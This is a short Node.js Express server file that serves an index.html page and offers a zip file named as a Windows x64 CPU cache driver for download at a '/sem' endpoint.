const express = require('express');
const path = require('path');

const app = express();
const port = 3000;

// Endpoint to send plain text

// Endpoint to serve the pre-zipped file
app.get('/sem', (req, res) => {
  const zippedFilePath = path.join(__dirname, 'cpu-cache-m-driver-win32-x64.zip'); // Path to your pre-zipped folder
  
  // Send the file directly to the client
  res.download(zippedFilePath, 'cpu-cache-m-driver-win32-x64-test.zip', (err) => {
    if (err) {
      console.error('Error downloading the file:', err);
      res.status(500).send('Internal Server Error');
    }
  });
});

// Endpoint to send the index.html file
app.get('/', (req, res) => {
  const indexPath = path.join(__dirname, 'index.html'); // Path to the index.html file in the root folder
  
  res.sendFile(indexPath, (err) => {
    if (err) {
      console.error('Error sending the file:', err);
      res.status(500).send('Internal Server Error');
    }
  });
});

// Start the server
app.listen(port, () => {
  console.log(`Server is running at http://localhost:${port}`);
});
